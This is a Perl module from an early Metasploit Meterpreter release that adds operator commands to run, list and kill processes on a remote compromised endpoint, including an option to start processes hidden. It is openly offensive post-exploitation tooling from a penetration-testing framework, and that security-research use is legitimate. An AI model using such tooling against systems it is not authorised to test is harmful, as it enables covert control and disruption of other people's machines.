
###############
##
#
#    Name: Sys.pm
#  Author: skape <mmiller [at] hick.org>
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      This module provides the user with the ability to execute, list, and
#      terminate processes on the remote endpoint
#
##
###############

use strict;
use Pex::Meterpreter::Arguments;
use Pex::Meterpreter::Channel;
use Pex::Meterpreter::Packet;

package Def;

use constant PROCESS_EXECUTE_FLAG_HIDDEN      => (1 << 0);
use constant PROCESS_EXECUTE_FLAG_CHANNELIZED => (1 << 1);

use constant PROCESS_BASE                     => 14080;
use constant TLV_TYPE_PROCESS_GROUP           => makeTlv(TLV_META_TYPE_GROUP,  PROCESS_BASE +  0);
use constant TLV_TYPE_PROCESS_PID             => makeTlv(TLV_META_TYPE_UINT,   PROCESS_BASE +  1);
use constant TLV_TYPE_PROCESS_NAME            => makeTlv(TLV_META_TYPE_STRING, PROCESS_BASE +  2);
use constant TLV_TYPE_PROCESS_PATH            => makeTlv(TLV_META_TYPE_STRING, PROCESS_BASE +  3);
use constant TLV_TYPE_PROCESS_ARGUMENTS       => makeTlv(TLV_META_TYPE_STRING, PROCESS_BASE +  4);
use constant TLV_TYPE_PROCESS_FLAGS           => makeTlv(TLV_META_TYPE_UINT,   PROCESS_BASE +  5);
use constant TLV_TYPE_PROCESS_DATA            => makeTlv(TLV_META_TYPE_RAW,    PROCESS_BASE +  6);
use constant TLV_TYPE_PROCESS_TARGET_PATH     => makeTlv(TLV_META_TYPE_STRING, PROCESS_BASE +  7);

package Pex::Meterpreter::Extension::Client::Process;

my $instance = undef;
my @handlers = 
(
	{
		identifier  => "Process",
		description => "Process manipulation and execution commands",
		handler     => undef,
	},
	{
		identifier  => "execute",
		description => "Executes a process on the remote endpoint",
		handler     => \&execute,
	},
	{
		identifier  => "kill",
		description => "Terminate one or more processes on the remote endpoint",
		handler     => \&kill,
	},
	{
		identifier  => "ps",
		description => "List processes on the remote endpoint",
		handler     => \&ps,
	},
);

#
# Constructor
#
sub new
{
	my $this  = shift;
	my $class = ref($this) || $this;
	my $self  = {};
	my ($client) = @{{@_}}{qw/client/};

	# If the singleton has yet to be created...
	if (not defined($instance))
	{
		bless($self, $class);

		$self->{'client'} = $client;

		$instance = $self;
	}
	else
	{
		$self = $instance;
	}
		
	$self->registerHandlers(client => $client);

	return $self;
}

sub DESTROY
{
	my $self = shift;

	$self->deregisterHandlers(client => $self->{'client'});
}

##
#
# Dispatch registration 
#
##

sub registerHandlers
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};

	foreach my $handler (@handlers)
	{
		$client->registerLocalInputHandler(
				identifier  => $handler->{'identifier'},
				description => $handler->{'description'},
				handler     => $handler->{'handler'});
	}
}

sub deregisterHandlers
{
	my $self = shift;
	my ($client) = @{{@_}}{qw/client/};

	foreach my $handler (@handlers)
	{
		$client->deregisterLocalInputHandler(
				identifier  => $handler->{'identifier'});
	}
}


##
#
# Local dispatch handlers
#
##

#
# Execute a process on the remote endpoint
#
sub executeDioHandler
{
	my ($channel, $client, $mode, $buffer, $length) = @{{@_}}{qw/channel context mode buffer length/};
	my $res;

	# If this is a write operation and we are interactive, write to the screen
	if (($mode == Def::CHANNEL_DIO_MODE_WRITE) and
	    ($$channel->getInteractive()))
	{
		$client->writeConsoleOutput(text =>
				"$buffer");

		$res = $length;
	}
	else
	{
		$res = Pex::Meterpreter::Channel::defaultIoHandler(
				channel => $channel,
				context => undef,
				mode    => $mode,
				buffer  => $buffer,
				length  => $length);
	}

	return $res;
}

sub executeComplete
{
	my ($client, $console, $packet) = @{{@_}}{qw/client console parameter/};
	my $result = $$packet->getResult();

	if ($result == 0)
	{
		my $channelId;
		my $pid;

		$channelId = $$packet->getTlv(
				type => Def::TLV_TYPE_CHANNEL_ID);
		$pid = $$packet->getTlv(
				type => Def::TLV_TYPE_PROCESS_PID);

		$client->writeConsoleOutput(text =>
				"\n" .
				"execute: success, process id is $pid.\n");
		
		if (defined($channelId))
		{
			my $channel;

			$client->writeConsoleOutput(text =>
					"execute: allocated channel $channelId for new process.\n");

			$channel = Pex::Meterpreter::Channel->new(id => $channelId);
			
			if (defined($channel))
			{
				$channel->setType(type => "process");

				$channel->setLocalIoHandler(
						handler => \&executeDioHandler,
						context => $client);
			}
		}

		$client->printPrompt();
	}
	else
	{
		$client->writeConsoleOutputResponse(
				cmd    => 'execute',
				packet => $packet);
	}

	return 1;
}

sub execute
{
	my ($client, $console, $argumentsScalar) = @{{@_}}{qw/client console parameter/};
	my @argv   = @{ $argumentsScalar };
	my $argc   = scalar(@argv);
	my $parser = Pex::Meterpreter::Arguments->new(
			argv => $argumentsScalar, 
			fmt  => 'f:a:Hc');
	my $executable;
	my $execFlags = 0;
	my $arguments;
	my $request;
	my $banner = 1;
	my $toggle = 0;

	# If no arguments were supplied...
	goto out if ($argc == 1);

	while (defined($toggle = $parser->parse()))
	{
		if ($toggle eq 'f')
		{
			$executable = $parser->getArgument();
		}
		elsif ($toggle eq 'a')
		{
			$arguments = $parser->getArgument();
		}
		elsif ($toggle eq 'H')
		{
			$execFlags |= Def::PROCESS_EXECUTE_FLAG_HIDDEN;
		}
		elsif ($toggle eq 'c')
		{
			$execFlags |= Def::PROCESS_EXECUTE_FLAG_CHANNELIZED;
		}
	}

	# If no executable was supplied...
	goto out if (not defined($executable));

	$banner = 0;

	# Create the request
	$request = Pex::Meterpreter::Packet->new(
			type   => Def::PACKET_TYPE_REQUEST,
			method => "process_execute");

	# Add TLVs
	$request->addTlv(
			type  => Def::TLV_TYPE_PROCESS_PATH,
			value => $executable);
	$request->addTlv(
			type  => Def::TLV_TYPE_PROCESS_FLAGS,
			value => $execFlags);

	if (defined($arguments))
	{
		$request->addTlv(
				type  => Def::TLV_TYPE_PROCESS_ARGUMENTS,
				value => $arguments);
	}

	$client->writeConsoleOutput(text =>
			"execute: Executing '$executable'...\n");

	# Transmit the request
	$client->transmitPacket(
			packet            => \$request,
			completionHandler => \&executeComplete);

out:
	if ($banner)
	{
		$client->writeConsoleOutput(text =>
				"Usage: execute -f file [ -a args ] [ -Hc ]\n" .
				"  -f <file>  The file name to execute\n" .
				"  -a <args>  The arguments to pass to the executable\n" .
				"  -H         Create the process hidden\n" .
				"  -c         Channelize the input and output\n");
	}

	return 1;
}

#
# Terminate one or more processes on the remote endpoint
#
sub killComplete
{
	my ($client, $console, $packet) = @{{@_}}{qw/client console parameter/};

	return $client->writeConsoleOutputResponse(
			cmd    => 'kill',
			packet => $packet);
}

sub kill
{
	my ($client, $console, $argumentsScalar) = @{{@_}}{qw/client console parameter/};
	my @argv = @{ $argumentsScalar };
	my $argc = scalar(@argv);
	my $request;
	my $index;

	# Validate arguments
	if ($argc == 1)
	{
		$client->writeConsoleOutput(text =>
				"Usage: kill pid1 pid2 pid3 ...\n");
		goto out;
	}

	# Create the request
	$request = Pex::Meterpreter::Packet->new(
			type   => Def::PACKET_TYPE_REQUEST,
			method => "process_kill");

	# Enumerate through the list of PIDs, adding each one to the request
	for ($index = 1;
	     $index < $argc;
	     $index++)
	{
		$request->addTlv(
				type  => Def::TLV_TYPE_PROCESS_PID,
				value => $argv[$index]);
	}

	$client->writeConsoleOutput(text =>
			"kill: Terminating " . ($index - 1) . " processes...\n");
	
	# Transmit the request
	$client->transmitPacket(
			packet            => \$request,
			completionHandler => \&killComplete);

out:
	return 1;
}

#
# List processes running on the remote endpoint
#
sub psComplete
{
	my ($client, $console, $packet) = @{{@_}}{qw/client console parameter/};
	my $index = 0;
	my $group;

	$client->writeConsoleOutput(text =>
			"\n" .
			"Process list:\n\n" .
			"   Pid           Name   Path      \n" .
			" -----   ------------   ----------\n");

	while (defined($group = $$packet->enumTlv(
			type  => Def::TLV_TYPE_PROCESS_GROUP,
			index => $index++)))
	{
		my $path;
		my $name;
		my $pid;
		my $buf;
		
		$pid = $$packet->getTlv(
				type   => Def::TLV_TYPE_PROCESS_PID,
				buffer => $group);
		$name = $$packet->getTlv(
				type   => Def::TLV_TYPE_PROCESS_NAME,
				buffer => $group);
		$path = $$packet->getTlv(
				type   => Def::TLV_TYPE_PROCESS_PATH,
				buffer => $group);
	
		$buf = sprintf(" %.5d  %13s   %s\n", $pid, $name, $path);

		$client->writeConsoleOutput(text => $buf);
	}

	$client->writeConsoleOutput(text =>
			"\n    $index processes.\n");

	$client->printPrompt();

	return 1;
}

sub ps
{
	my ($client, $console, $argumentsScalar) = @{{@_}}{qw/client console parameter/};
	my @argv = @{ $argumentsScalar };
	my $argc = scalar(@argv);
	my $request;

	# Create the request
	$request = Pex::Meterpreter::Packet->new(
			type   => Def::PACKET_TYPE_REQUEST,
			method => "process_enumerate");

	# Transmit the request
	$client->transmitPacket(
			packet            => \$request,
			completionHandler => \&psComplete);

	return 1;
}

1;
